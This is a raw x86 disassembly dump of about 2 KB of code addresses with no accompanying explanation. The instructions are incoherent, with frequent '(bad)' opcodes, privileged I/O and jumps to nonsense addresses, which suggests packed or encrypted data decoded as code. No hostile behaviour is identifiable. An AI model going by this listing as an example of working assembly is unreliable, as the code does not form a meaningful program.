  40ac0e:	test   DWORD PTR [ebp-0xa6719],edx
  40ac14:	mov    al,ds:0x7d502255
  40ac19:	lahf   
  40ac1a:	inc    ebp
  40ac1b:	inc    ecx
	...
  40ac30:	mov    WORD PTR [ebp+0x12],?
  40ac33:	push   edx
  40ac34:	xchg   esi,eax
  40ac35:	jge    0x40ac41
  40ac37:	or     ecx,esp
  40ac39:	outs   dx,DWORD PTR ds:[esi]
  40ac3a:	or     bl,ch
  40ac3c:	add    BYTE PTR [bx-0x3e],ah
  40ac40:	cli    
  40ac41:	in     eax,0xc
  40ac43:	lea    ecx,[esi+0x31]
  40ac46:	jae    0x40abcd
  40ac48:	and    bh,dh
  40ac4a:	or     al,0xff
  40ac4c:	je     0x40ac57
  40ac4e:	mov    dl,0x40
  40ac50:	mov    esi,es
  40ac52:	xchg   BYTE PTR [ebx],cl
  40ac54:	in     al,0x25
  40ac56:	js     0x40ac57
  40ac58:	retf   
  40ac59:	aad    0x46
  40ac5b:	mov    ah,0xc2
  40ac5d:	lods   eax,DWORD PTR ds:[esi]
  40ac5e:	or     al,0x50
  40ac60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac61:	lds    esi,FWORD PTR [edi-0x1]
  40ac64:	mov    bl,0xf3
  40ac66:	jbe    0x40ac18
  40ac68:	stos   BYTE PTR es:[edi],al
  40ac69:	mov    ch,0xc
  40ac6b:	push   eax
  40ac6c:	xor    al,0xf1
  40ac6e:	scas   al,BYTE PTR es:[edi]
  40ac6f:	inc    eax
  40ac70:	mov    WORD PTR [esi-0x626d4fba],es
  40ac76:	or     al,0xe8
  40ac78:	xchg   ebp,eax
  40ac79:	adc    cl,BYTE PTR [edx]
  40ac7b:	add    BYTE PTR [edi-0x1bed7a45],dl
  40ac81:	fldcw  WORD PTR [esi+0x447e8c40]
  40ac87:	mov    al,0x6a
  40ac89:	ja     0x40ac95
  40ac8b:	(bad)  
  40ac8c:	fldenv [ebx-0x1e]
  40ac8f:	js     0x40acea
  40ac91:	inc    edi
  40ac92:	or     ch,al
	...
  40aca8:	aad    0xcd
  40acaa:	or     edi,edi
  40acac:	sbb    DWORD PTR [ecx],eax
  40acae:	iret   
  40acaf:	std    
  40acb0:	inc    ebx
  40acb1:	das    
  40acb2:	pop    ebp
  40acb3:	inc    DWORD PTR [ecx]
  40acb5:	call   0x5474abc4
  40acba:	loopne 0x40ad34
  40acbc:	mov    WORD PTR [edi+ebx*8+0x6c9de388],ss
  40acc3:	dec    ecx
  40acc4:	sbb    ebp,DWORD PTR [esi-0x61]
  40acc7:	add    ebx,ecx
  40acc9:	xor    BYTE PTR [esi-0x5782f4fd],al
  40accf:	jge    0x40ac5d
  40acd1:	xchg   esp,eax
  40acd2:	jbe    0x40ac8d
  40acd4:	inc    ebx
  40acd5:	outs   dx,DWORD PTR ds:[esi]
  40acd6:	jg     0x40acdb
  40acd8:	in     al,0xdb
  40acda:	push   ebp
  40acdb:	add    ebp,ebx
  40acdd:	pop    ebx
  40acde:	and    cl,BYTE PTR [esp+ecx*4]
  40ace1:	(bad)  
  40ace2:	jp     0x40acd4
  40ace4:	(bad)  
  40ace6:	jmp    0x40acd3
  40ace8:	std    
  40ace9:	add    al,BYTE PTR [edi+0x3]
  40acec:	xchg   edi,eax
  40aced:	push   esp
  40acee:	mov    ah,0x12
  40acf0:	pop    esp
  40acf1:	les    esi,FWORD PTR [esi]
  40acf3:	jns    0x40ac79
  40acf5:	jl     0x40ac82
  40acf7:	add    dh,BYTE PTR [ebx+0x1a2b486d]
  40acfd:	outs   dx,BYTE PTR ds:[esi]
  40acfe:	das    
  40acff:	int    0xcd
  40ad01:	pushf  
  40ad02:	fistp  WORD PTR [eax+0x7]
  40ad05:	and    DWORD PTR [ebx-0x38],0x6ddffa97
	...
  40ad20:	lods   eax,DWORD PTR ds:[esi]
  40ad21:	ins    DWORD PTR es:[edi],dx
  40ad22:	jne    0x40ad2f
  40ad24:	je     0x40ad01
  40ad26:	jp     0x40ad2b
  40ad28:	jnp    0x40ad45
  40ad2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad2b:	jmp    ebp
  40ad2d:	mov    ah,dh
  40ad2f:	js     0x40acc5
  40ad31:	jl     0x40ace2
  40ad33:	add    ah,BYTE PTR [ebx+0x6d]
  40ad36:	pop    edx
  40ad37:	daa    
  40ad38:	pop    ebx
  40ad39:	out    0xe7,eax
  40ad3b:	jmp    0x40ad55
  40ad3d:	ins    DWORD PTR es:[edi],dx
  40ad3e:	mov    DWORD PTR [edx],0x78ce90b6
  40ad44:	xchg   esp,eax
  40ad45:	jl     0x40ace2
  40ad47:	add    bh,BYTE PTR [ebx]
  40ad49:	ins    DWORD PTR es:[edi],dx
  40ad4a:	or     DWORD PTR [ebx-0x78],eax
  40ad4d:	cld    
  40ad4e:	int3   
  40ad4f:	or     al,0xd1
  40ad51:	xchg   esp,eax
  40ad52:	pusha  
  40ad53:	push   ebp
  40ad54:	lods   al,BYTE PTR ds:[esi]
  40ad55:	ror    DWORD PTR [eax],cl
  40ad57:	sahf   
  40ad58:	push   esp
  40ad59:	dec    esp
  40ad5a:	inc    ecx
  40ad5b:	sub    BYTE PTR [eax-0x71860784],cl
  40ad61:	ins    DWORD PTR es:[edi],dx
  40ad62:	add    ch,BYTE PTR [ecx+0x1158887b]
  40ad68:	xor    dl,al
  40ad6a:	inc    edi
  40ad6b:	jmp    0xe1bd1acf
  40ad70:	not    DWORD PTR [ebx-0xb]
  40ad73:	data16 mov ?,WORD PTR [eax+ecx*8+0x6c]
  40ad78:	mov    gs,WORD PTR [ebp+0x63]
  40ad7b:	jmp    0xa894f5e7
  40ad80:	(bad)  
  40ad81:	cld    
  40ad82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  40ad98:	dec    eax
  40ad99:	xchg   esp,eax
  40ad9a:	cmc    
  40ad9b:	hlt    
  40ad9c:	xlat   BYTE PTR ds:[ebx]
  40ad9d:	aam    0x47
  40ad9f:	jmp    0x2eda004b
  40ada4:	mov    ds,WORD PTR [ecx-0x3b846238]
  40adaa:	pusha  
  40adab:	dec    ebx
  40adac:	sub    al,0xd3
  40adae:	or     BYTE PTR [ecx+0x100e78e],bh
  40adb4:	and    DWORD PTR [eax-0xa],esi
  40adb7:	push   es
  40adb8:	ja     0x40adc0
  40adba:	test   dh,bh
  40adbc:	(bad)  
  40adbd:	dec    BYTE PTR [eax]
  40adbf:	or     DWORD PTR [edi-0x2f731104],0xffffff94
  40adc6:	pusha  
  40adc7:	jmp    0xd1c9425b
  40adcc:	cmc    
  40adcd:	sbb    esi,esi
  40adcf:	(bad)  
  40add0:	adc    DWORD PTR [ebp+edi*2+0x5],0xe0c4e0
  40add8:	jae    0x40ade7
  40adda:	idiv   edi
  40addc:	ds pop eax
  40adde:	jp     0x40adf4
  40ade0:	xchg   ebp,eax
  40ade1:	clc    
  40ade2:	stos   BYTE PTR es:[edi],al
  40ade3:	pop    ebp
  40ade4:	je     0x40ad76
  40ade6:	pop    eax
  40ade7:	inc    DWORD PTR [eax-0x6a31f68]
  40aded:	xchg   ebp,eax
  40adee:	cmc    
  40adef:	call   0x37c94d
  40adf4:	or     eax,0xaff83ce
  40adf9:	xchg   esi,eax
  40adfa:	jnp    0x40adf8
	...
  40ae10:	jp     0x40adf5
  40ae12:	add    al,ch
  40ae14:	das    
  40ae15:	sbb    esi,edi
  40ae17:	jmp    FWORD PTR [ebx+edx*2]
  40ae1a:	or     al,BYTE PTR [eax]
  40ae1c:	and    BYTE PTR [ecx],bl
  40ae1e:	loop   0x40ada1
  40ae20:	mov    cl,0x64
  40ae22:	(bad)  
  40ae23:	(bad)  
  40ae24:	cmp    bl,BYTE PTR [ebx]
  40ae26:	dec    ebp
  40ae27:	cld    
  40ae28:	add    eax,0x4a107b95
  40ae2d:	jecxz  0x40ae33
  40ae2f:	call   0x499cfb
  40ae34:	scas   al,BYTE PTR es:[edi]
  40ae35:	push   edi
  40ae36:	pop    es
  40ae37:	test   DWORD PTR [esi-0x70],ebp
  40ae3a:	or     BYTE PTR [eax],al
  40ae3c:	jb     0x40ae11
  40ae3e:	lock add BYTE PTR [ebp-0x1f38f769],ah
  40ae45:	arpl   di,si
  40ae47:	pop    es
  40ae48:	jne    0x40ade1
  40ae4a:	bound  eax,QWORD PTR [eax]
  40ae4c:	pop    ds
  40ae4d:	xchg   edi,eax
  40ae4e:	bound  eax,QWORD PTR [eax]
  40ae50:	pop    ds
  40ae51:	xchg   edi,eax
  40ae52:	add    DWORD PTR [ebp+0x71],0xffffffc7
  40ae56:	add    DWORD PTR [ebp-0x8939f],0xffffffa5
  40ae5d:	xchg   ebp,eax
  40ae5e:	jnp    0x40ae58
  40ae60:	cmp    ah,dl
  40ae62:	hlt    
  40ae63:	call   0xb237f4
  40ae68:	mov    WORD PTR [esi-0x36],?
  40ae6b:	jae    0x40adf6
  40ae6d:	inc    esp
  40ae6e:	cwde   
  40ae6f:	(bad)  
  40ae70:	cmp    edi,DWORD PTR [ebp+0x62]
  40ae73:	mov    ah,0x0
	...
  40ae85:	add    BYTE PTR [eax],al
  40ae87:	add    ah,al
  40ae89:	mov    esp,0x4da1ff0c
  40ae8e:	loop   0x40ae14
  40ae90:	cld    
  40ae91:	xor    DWORD PTR [ecx],ecx
  40ae93:	push   eax
  40ae94:	pop    es
  40ae95:	sub    eax,0xa188487
  40ae9a:	or     edi,edi
  40ae9c:	pop    esp
  40ae9d:	scas   eax,DWORD PTR es:[edi]
  40ae9e:	in     al,0x74
  40aea0:	sbb    al,0x12
  40aea2:	or     DWORD PTR [ecx-0x10f12ef],ecx
  40aea8:	repz adc al,0xc5
  40aeab:	mov    ebp,ebx
  40aead:	stc    
  40aeae:	arpl   WORD PTR [eax],ax
  40aeb0:	je     0x40ae33
  40aeb2:	push   0x41
  40aeb4:	mov    edx,cs
  40aeb6:	mov    esi,0x8c1dbef
  40aebb:	inc    DWORD PTR [ecx+0x49]
  40aebe:	loop   0x40ae8d
  40aec0:	adc    edx,edx
  40aec2:	or     BYTE PTR [ecx-0x10f26ef],cl
  40aec8:	mov    bl,0xfd
  40aeca:	mov    dh,0xeb
  40aecc:	mov    ds:0x180008b9,eax
  40aed1:	outs   dx,BYTE PTR ds:[esi]
  40aed2:	bound  eax,QWORD PTR [ecx]
  40aed4:	mov    WORD PTR [edx-0x6f260139],ds
  40aeda:	lock dec BYTE PTR [ebx+0x74087e9b]
  40aee1:	adc    al,0xbc
  40aee3:	(bad)  
  40aee4:	jnp    0x40af51
  40aee6:	mov    esp,0xf6637beb
  40aeeb:	out    0x0,eax
	...
  40aefd:	add    BYTE PTR [eax],al
  40aeff:	add    BYTE PTR ds:0x63ff08c8,dl
  40af05:	xchg   ebp,eax
  40af06:	xchg   esp,eax
  40af07:	hlt    
  40af08:	bound  ebp,QWORD PTR [edx-0x29]
  40af0b:	(bad)  
  40af0c:	fcomp  DWORD PTR [eax+0x7c9479de]
  40af12:	adc    bh,bh
  40af14:	inc    edx
  40af15:	push   0xffffffcf
  40af17:	mov    ecx,0xffb7622b
  40af1c:	sub    edi,eax
  40af1e:	imul   edi,edi,0x2a
  40af21:	push   0x2d
  40af23:	cld    
  40af24:	xor    al,0xd1
  40af26:	scas   al,BYTE PTR es:[edi]
  40af27:	call   FWORD PTR [edx]
  40af29:	push   0x1d
  40af2b:	add    BYTE PTR [esp+ebx*1],ah
  40af2e:	sbb    BYTE PTR [esp+ecx*4],al
  40af31:	pop    ebx
  40af32:	mov    ds:0x7abf8c10,al
  40af37:	lock or al,0x51
  40af3a:	cwde   
  40af3b:	div    edx
  40af3d:	imul   ebp,DWORD PTR [ebp+0x49],0x7966c4e8
  40af44:	jl     0x40afaf
  40af46:	aad    0xf
  40af48:	in     al,0xe5
  40af4a:	out    0x3,eax
  40af4c:	mov    WORD PTR [ebp-0x74eef0e1],ds
  40af52:	loopne 0x40af57
  40af54:	mov    WORD PTR [ecx-0x5b],ss
  40af57:	sti    
  40af58:	mov    ebx,0xcb03e069
  40af5d:	iret   
  40af5e:	xor    edi,edi
  40af60:	xchg   edx,eax
  40af61:	xchg   esp,eax
  40af62:	fild   QWORD PTR [ecx+0x0]
	...
  40af75:	add    BYTE PTR [eax],al
  40af77:	add    BYTE PTR [esi+edi*8-0x1739621],cl
  40af7e:	fist   WORD PTR [eax-0x6f4f9fb8]
  40af84:	adc    BYTE PTR [eax+0x1f],ah
  40af87:	inc    DWORD PTR [edx+0x74790ec4]
  40af8d:	imul   edi,DWORD PTR [ebp-0x1],0x7108cf6b
  40af94:	(bad)  
  40af95:	xchg   esp,eax
  40af96:	add    DWORD PTR [ecx],ebp
  40af98:	in     al,0x8f
  40af9a:	(bad)  
  40af9c:	(bad)  
  40af9d:	xchg   esp,eax
  40af9e:	or     BYTE PTR [ecx+0x14],dl
  40afa1:	rol    DWORD PTR [edi-0x17],1
  40afa4:	dec    edx
  40afa5:	loopne 0x40afbf
  40afa7:	rcr    DWORD PTR [ecx],0x1a
  40afaa:	test   dh,0xdf
  40afad:	sbb    eax,0x65046cd9
  40afb2:	(bad)  
  40afb3:	mov    dh,0x2a
  40afb5:	fstp   DWORD PTR [edx-0x3f]
  40afb8:	or     DWORD PTR [edx],ebx
  40afba:	mul    BYTE PTR [esi-0x6906eff8]
  40afc0:	adc    ch,BYTE PTR [edx-0x1f]
  40afc3:	mov    ch,0x16
  40afc5:	push   0xfffffff6
  40afc7:	add    ecx,DWORD PTR [eax+0x348608fe]
  40afcd:	jns    0x40afcd
  40afcf:	jle    0x40afc3
  40afd1:	imul   edi,DWORD PTR [ebp+eiz*8-0x9],0xe26e8772
  40afd9:	sbb    ecx,DWORD PTR [ebp+edx*2+0x0]
	...
  40aff0:	loop   0x40b05b
  40aff2:	neg    BYTE PTR [esi+0x14]
  40aff5:	jge    0x40aff5
  40aff7:	push   esi
  40aff8:	retf   0x8270
  40affb:	je     0x40afbf
  40affd:	imul   eax,DWORD PTR [edx],0x58f54329
  40b003:	jo     0x40b009
  40b005:	jno    0x40b005
  40b007:	ss stos BYTE PTR es:[edi],al
  40b009:	imul   edi,DWORD PTR [ecx+eax*2+0x11f6699a],0x1ef618c7
  40b014:	xchg   BYTE PTR [ebp+edi*2-0x5f],dl
  40b018:	not    DWORD PTR [edx-0xfbf01f8]
  40b01e:	mov    eax,0x8d13300
  40b023:	(bad)  
  40b024:	mov    eax,0x62ffff7b
  40b029:	push   0x7d
  40b02b:	or     BYTE PTR [ebp+0x72ffbce8],cl
  40b031:	stc    
  40b032:	or     al,BYTE PTR [eax]
  40b034:	inc    edx
  40b035:	daa    
  40b036:	outs   dx,BYTE PTR ds:[esi]
  40b037:	rol    BYTE PTR [ebx+0x18ff08d3],0x79
  40b03e:	(bad)  
  40b03f:	call   DWORD PTR [edx+0x6a]
  40b042:	jge    0x40b04c
  40b044:	pop    ebp
  40b045:	hlt    
  40b046:	mov    esp,0x8f8e2ff
  40b04b:	add    dl,ah
  40b04d:	outs   dx,BYTE PTR es:[esi]
  40b04f:	add    al,0xd3
  40b051:	ror    DWORD PTR [eax],cl
  40b053:	inc    DWORD PTR [eax]
	...
  40b065:	add    BYTE PTR [eax],al
  40b067:	add    BYTE PTR [eax+0x22ffff78],bh
  40b06d:	push   0x7d
  40b06f:	or     BYTE PTR ds:0x12ffbcdc,cl
  40b075:	jns    0x40b0cf
  40b077:	mov    esi,DWORD PTR [edx+0x69]
  40b07a:	div    DWORD PTR [ebp-0x89def]
  40b080:	or     eax,0x72ff81d2
  40b085:	imul   edi,DWORD PTR [ebp-0x896c510],0xf597e8ff
  40b08f:	jne    0x40b03e
  40b091:	jnp    0x40b068
  40b093:	(bad)  
  40b094:	push   edx
  40b095:	imul   esi,edi,0xf76175b5
  40b09b:	dec    DWORD PTR [ebp-0x43]
  40b09e:	cmp    edi,0xf84d6972
  40b0a4:	jl     0x40b109
  40b0a6:	hlt    
  40b0a7:	push   DWORD PTR [edx+0x69]
  40b0aa:	jge    0x40b0a8
  40b0ac:	mov    WORD PTR [ebp+0x7d8c774b],ss
  40b0b2:	ret    
  40b0b3:	ror    DWORD PTR [eax+0x608b5f7d],0xfa
  40b0ba:	sar    bl,0xf6
  40b0bd:	jge    0x40b11f
  40b0bf:	and    ah,BYTE PTR [ebx-0x20]
  40b0c2:	add    eax,ebp
  40b0c4:	cdq    
  40b0c5:	in     eax,0xf4
  40b0c7:	inc    BYTE PTR ds:0x6808b0
	...
  40b0dd:	add    BYTE PTR [eax],al
  40b0df:	add    BYTE PTR [ebp+edi*2+0x71b4bde5],cl
  40b0e6:	push   esp
  40b0e7:	inc    ecx
  40b0e8:	mov    ebp,es
  40b0ea:	adc    BYTE PTR [esi-0x33],bl
  40b0ed:	jge    0x40b0e4
  40b0ef:	je     0x40b085
  40b0f1:	push   ebp
  40b0f2:	and    dh,BYTE PTR [ebx+eiz*1-0x45e39dca]
  40b0f9:	mov    esp,0x5559ff0c
  40b0fe:	inc    edx
  40b0ff:	inc    ecx
  40b100:	mov    esi,?
  40b102:	jle    0x40b10c
  40b104:	hlt    
  40b105:	in     al,dx
  40b106:	idiv   dh
  40b108:	sti    
  40b109:	test   BYTE PTR [eax],ch
  40b10b:	pop    esi
  40b10c:	dec    ebp
  40b10d:	jge    0x40b171
  40b10f:	add    cl,BYTE PTR [ebp+edi*2+0x7559fe8a]
  40b116:	loop   0x40b195
  40b118:	fldln2 
  40b11a:	hlt    
  40b11b:	addr16 pushf 
  40b11d:	daa    
  40b11e:	dec    ebx
  40b11f:	add    BYTE PTR [ebx+edi*2],dh
  40b122:	or     al,BYTE PTR [eax]
  40b124:	or     al,0xd6
  40b126:	jle    0x40b130
  40b128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b129:	xor    esp,esi
  40b12b:	(bad)  
  40b12c:	mov    bl,0x44
  40b12e:	jp     0x40b18e
  40b130:	dec    ebp
  40b131:	jge    0x40b195
  40b133:	add    cl,BYTE PTR [ebp+edi*2-0x6bde0176]
  40b13a:	imul   ebx
  40b13c:	inc    esp
  40b13d:	popw   ss
  40b13f:	cld    
  40b140:	mov    ah,al
  40b142:	sbb    edi,esp
	...
  40b158:	clc    
  40b159:	pushf  
  40b15a:	pop    es
  40b15b:	push   ss
  40b15c:	add    al,0x66
  40b15e:	bswap  edx
  40b160:	dec    ebp
  40b161:	xchg   ecx,eax
  40b162:	fist   WORD PTR [esi+0x17]
  40b165:	jns    0x40b166
  40b167:	jne    0x40b0f9
  40b169:	jl     0x40b16b
  40b16b:	lea    ebx,[edx+0x66]
  40b16e:	sti    
  40b16f:	ret    
  40b170:	fild   QWORD PTR [ebx-0x2c1612a9]
  40b176:	fist   WORD PTR [ebx+0x34]
  40b179:	stc    
  40b17a:	push   ebp
  40b17b:	sti    
  40b17c:	cmp    al,ch
  40b17e:	(bad)  
  40b180:	mov    WORD PTR [esi+eax*8+0x1e58b3ba],ss
  40b187:	inc    ebp
  40b188:	mov    esp,es
  40b18a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b18b:	jno    0x40b111
  40b18d:	jl     0x40b1c5
  40b18f:	mov    bh,0x12
  40b191:	dec    ax
  40b193:	ins    BYTE PTR es:[edi],dx
  40b194:	lea    edx,[esi+ecx*4+0x26496bba]
  40b19b:	inc    ebp
  40b19c:	mov    esp,es
  40b19e:	mov    ?,WORD PTR [ecx-0x7c]
  40b1a1:	jl     0x40b1c5
  40b1a3:	mov    bh,0xea
  40b1a5:	mov    BYTE PTR gs:[edi+0x16],cl
  40b1a9:	data16 addr16 int 0xcd
  40b1ad:	pushf  
  40b1ae:	fist   WORD PTR [eax+0x7]
  40b1b1:	jns    0x40b216
  40b1b3:	rol    bh,0xfa
  40b1b6:	fild   QWORD PTR [ebp+0x6f]
  40b1b9:	fisttp QWORD PTR gs:[ebx]
	...
  40b1d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1d1:	mul    DWORD PTR [esi-0x5]
  40b1d4:	mov    dl,0x1b
  40b1d6:	lods   eax,DWORD PTR ds:[esi]
  40b1d7:	div    DWORD PTR ds:0x1d36088a
  40b1dd:	pushf  
  40b1de:	loopne 0x40b234
  40b1e0:	xchg   edi,eax
  40b1e1:	data16 not BYTE PTR [ebx-0xe839a96]
  40b1e8:	ja     0x40b204
  40b1ea:	not    BYTE PTR [esi]
  40b1ec:	xchg   ebx,edi
  40b1ee:	adc    al,0xe
  40b1f0:	std    
  40b1f1:	pushf  
  40b1f2:	loopne 0x40b25c
  40b1f4:	ja     0x40b25c
  40b1f6:	idiv   dh
  40b1f8:	fsubr  QWORD PTR [eax-0xa]
  40b1fb:	jl     0x40b194
  40b1fd:	jl     0x40b18d
  40b1ff:	push   di
  40b201:	data16 shr BYTE PTR [ebx+0x725d6553],0x33
  40b209:	ret    0xeccd
  40b20c:	jmp    0x894:0x8fe947c4
  40b213:	jmp    0x3536fb7a
  40b218:	cwde   
  40b219:	jl     0x40b1e5
  40b21b:	cmp    eax,0x14819488
  40b220:	mov    BYTE PTR [ecx],dl
  40b222:	icebp  
  40b223:	jmp    0x40b1c2
  40b225:	or     DWORD PTR [ecx],0xffffffb9
  40b228:	adc    bh,BYTE PTR [ebx+0xb]
  40b22b:	wbinvd 
  40b22d:	stos   DWORD PTR es:[edi],eax
  40b22e:	push   esp
  40b22f:	sub    eax,0xae6e8f7d
	...
  40b248:	mov    eax,ecx
  40b24a:	or     BYTE PTR [esi+0x5c],bh
  40b24d:	cwde   
  40b24e:	loopne 0x40b243
  40b250:	pop    esp
  40b251:	xchg   esp,eax
  40b252:	or     BYTE PTR [ecx],al
  40b254:	or     dh,al
  40b256:	inc    edi
  40b257:	jmp    0xa8981ec3
  40b25c:	(bad)  
  40b25d:	jl     0x40b292
  40b25f:	jge    0x40b227
  40b261:	add    ch,BYTE PTR gs:[ecx]
  40b264:	sub    ebp,edi
  40b266:	cmc    
  40b267:	add    al,dh
  40b269:	cwde   
  40b26a:	cmc    
  40b26b:	adc    eax,0x47ca1d
  40b270:	ss and eax,0xe4650b0a
  40b276:	pop    ebx
  40b277:	call   DWORD PTR [eax+0x75415708]
  40b27d:	cmp    ebp,DWORD PTR [ebx-0x7667cba0]
  40b283:	cmp    eax,0x47f7c6
  40b288:	gs in  eax,0x0
  40b28b:	inc    DWORD PTR [eax+0x1c]
  40b28e:	push   edi
  40b28f:	inc    ecx
  40b290:	jne    0x40b305
  40b292:	xor    DWORD PTR [edx+0x65],ebp
  40b295:	repnz pop es
  40b297:	push   DWORD PTR [eax+0x39]
  40b29a:	push   esi
  40b29b:	inc    ecx
  40b29c:	xor    eax,0x7a9c1d5d
  40b2a1:	xlat   BYTE PTR ds:[ebx]
  40b2a2:	or     BYTE PTR [ebx-0x3ffe730f],al
  40b2a8:	jno    0x40b261
  40b2aa:	cmc    
  40b2ab:	xor    eax,0x0
	...
  40b2c0:	push   ss
  40b2c1:	stc    
  40b2c2:	inc    edi
  40b2c3:	add    dl,bl
  40b2c5:	xchg   ebx,eax
  40b2c6:	lods   al,BYTE PTR ds:[esi]
  40b2c7:	pop    edi
  40b2c8:	fs cwde 
  40b2ca:	mov    esp,eax
  40b2cc:	and    DWORD PTR [ebp+0x1d],ebx
  40b2cf:	mov    edx,cs
  40b2d1:	xlat   BYTE PTR ds:[ebx]
  40b2d2:	or     bh,al
  40b2d4:	lock cmp BYTE PTR [esi+0x41],dl
  40b2d8:	in     eax,0x97
  40b2da:	or     BYTE PTR [eax],al
  40b2dc:	in     eax,0x70
  40b2de:	or     DWORD PTR [ebx+0x5e],eax
  40b2e1:	pop    ecx
  40b2e2:	push   ebx
  40b2e3:	leave  
  40b2e4:	aaa    
  40b2e5:	xchg   ecx,eax
  40b2e6:	or     BYTE PTR [ebx+0x41563928],al
  40b2ec:	in     eax,0x97
  40b2ee:	jl     0x40b30f
  40b2f0:	push   0xffffffb3
  40b2f2:	test   eax,0xa2c8c60
  40b2f7:	jmp    DWORD PTR [ecx-0x73beafe7]
  40b2fd:	out    dx,al
  40b2fe:	enter  0xab03,0x48
  40b302:	mov    ds,WORD PTR [esi+0x4d]
  40b305:	ins    DWORD PTR es:[edi],dx
  40b306:	leave  
  40b307:	add    al,0xef
  40b309:	dec    ebp
  40b30a:	dec    ebx
  40b30b:	add    BYTE PTR [ebp+ebp*2+0x284f000a],cl
  40b312:	test   ebx,ebp
  40b314:	cmpxchg esp,edi
  40b317:	push   edx
  40b318:	pop    es
  40b319:	cmp    BYTE PTR [edx],al
  40b31b:	or     ecx,DWORD PTR [ecx+eiz*8+0x4]
  40b31f:	sub    ecx,0x71
  40b322:	or     dh,BYTE PTR [eax+eax*1+0x0]
	...
  40b336:	add    BYTE PTR [eax],al
  40b338:	mov    ebp,ebp
  40b33a:	xor    al,0x0
  40b33c:	loope  0x40b3b8
  40b33e:	and    eax,0xcc24b7c0
  40b343:	pop    es
  40b344:	mov    ebp,gs
  40b346:	xor    DWORD PTR [esi-0x48],edi
  40b349:	pop    ebp
  40b34a:	lea    edi,[edi+ebp*8]
  40b34d:	int3   
  40b34e:	dec    ecx
  40b34f:	add    BYTE PTR [eax+eiz*4-0x49b3d4f9],cl
  40b356:	rol    ecx,0x94
  40b359:	ins    DWORD PTR es:[edi],dx
  40b35a:	mov    dh,BYTE PTR [edi]
  40b35c:	call   0x4469:0xb98b32a8
  40b363:	sub    esi,0x6d
  40b366:	add    eax,0x8d7379d2
  40b36b:	jl     0x40b2f5
  40b36d:	ins    BYTE PTR es:[edi],dx
  40b36e:	addr16 add al,0xa7
  40b371:	sub    eax,0xafeb23e5
  40b376:	add    BYTE PTR [ebx-0x886b7],cl
  40b37c:	(bad)  
  40b37d:	ins    DWORD PTR es:[edi],dx
  40b37e:	or     al,cl
  40b380:	in     al,dx
  40b381:	xchg   ebx,eax
  40b382:	loope  0x40b3d7
  40b384:	mov    ah,0x3b
  40b386:	js     0x40b380
  40b388:	ret    0x6ac3
  40b38b:	dec    esi
  40b38c:	test   dh,dl
  40b38e:	scas   eax,DWORD PTR es:[edi]
  40b38f:	clc    
  40b390:	cmp    BYTE PTR [eax+0x79deb91],dl
  40b396:	aaa    
  40b397:	clc    
  40b398:	cmp    edi,DWORD PTR [edi+0xc528]
	...
  40b3ae:	add    BYTE PTR [eax],al
  40b3b0:	xchg   ebx,eax
  40b3b1:	xchg   esp,eax
  40b3b2:	or     bl,ch
  40b3b4:	xchg   edx,eax
  40b3b5:	call   0x8d41acb5
  40b3ba:	cdq    
  40b3bb:	add    esi,esi
  40b3bd:	xchg   esp,eax
  40b3be:	push   ds
  40b3bf:	push   cs
  40b3c0:	sbb    al,0xc2
  40b3c2:	mov    al,ds:0xd0590f03
  40b3c7:	or     al,0x4c
  40b3c9:	jmp    0x61093e5a
  40b3ce:	mov    al,BYTE PTR [edi]
  40b3d0:	or     eax,ebx
  40b3d2:	out    dx,eax
  40b3d3:	push   edx
  40b3d4:	fs es js 0x40b3cf
  40b3d8:	dec    edx
  40b3d9:	out    dx,eax
  40b3da:	fisttp WORD PTR [eax-0x8cf9b38]
  40b3e0:	shl    BYTE PTR [eax-0x39],0x11
  40b3e4:	in     al,dx
  40b3e5:	shl    DWORD PTR [eax],0x4
  40b3e8:	mulps  xmm4,xmm4
  40b3eb:	or     cl,BYTE PTR [eax+ebp*8-0xe]
  40b3ef:	mov    al,dl
  40b3f1:	arpl   WORD PTR fs:[eax+ecx*4-0x6c],di
  40b3f6:	adc    ebx,DWORD PTR [ebx]
  40b3f8:	pop    ss
  40b3f9:	aad    0xf7
  40b3fb:	inc    ebx
  40b3fc:	pop    esp
  40b3fd:	ins    BYTE PTR es:[edi],dx
  40b3fe:	adc    ecx,DWORD PTR [edx+edi*8+0xdc6b61]
  40b405:	fsubr  DWORD PTR [edi-0x9]
  40b408:	jnp    0x40b396
  40b40a:	adc    dh,bh
  40b40c:	jae    0x40b3a6
  40b40e:	or     BYTE PTR [ecx+0x6ef619f9],al
	...
  40b428:	xchg   sp,ax
  40b42a:	sub    DWORD PTR [edi+edi*4+0x13f4f5d1],0xffffffc3
  40b432:	inc    edi
  40b433:	jmp    0xc3420a46
  40b438:	mov    BYTE PTR [ecx+0x7c],ah
  40b43b:	inc    ebp
  40b43c:	mov    ds:0x489e9c88,eax
  40b441:	xchg   esp,eax
  40b442:	mov    DWORD PTR ds:0x92ca0d88,ebp
  40b448:	rcl    BYTE PTR [ebx+0x1],0xe9
  40b44c:	fmul   QWORD PTR ds:0x90fd1ee5
  40b452:	cmc    
  40b453:	pushf  
  40b454:	xchg   DWORD PTR [ecx+0x1c],esp
  40b457:	jb     0x40b441
  40b459:	ror    DWORD PTR [eax],cl
  40b45b:	push   0x4c
  40b45d:	cdq    
  40b45e:	pop    eax
  40b45f:	(bad)  
  40b460:	fcom   QWORD PTR [eax+0x61877cf5]
  40b466:	sbb    al,0x56
  40b468:	call   0xbaabd40
  40b46d:	cdq    
  40b46e:	xor    DWORD PTR [eax+ebx*4],0x49310b0b
  40b475:	push   ebx
  40b476:	add    eax,0xe50ddce9
  40b47b:	push   0xffffffeb
  40b47d:	js     0x40b475
  40b47f:	xor    al,0x94
  40b481:	ins    BYTE PTR es:[edi],dx
  40b482:	ret    
  40b483:	and    ah,BYTE PTR gs:[edx+0x2]
  40b487:	test   eax,0xabbf989c
	...
  40b4a0:	lahf   
  40b4a1:	xchg   esp,eax
  40b4a2:	cmc    
  40b4a3:	adc    al,0x94
  40b4a5:	ins    BYTE PTR es:[edi],dx
  40b4a6:	mov    ah,0x47
  40b4a8:	add    ah,BYTE PTR [edx+0x2]
  40b4ab:	test   eax,0xbf9863
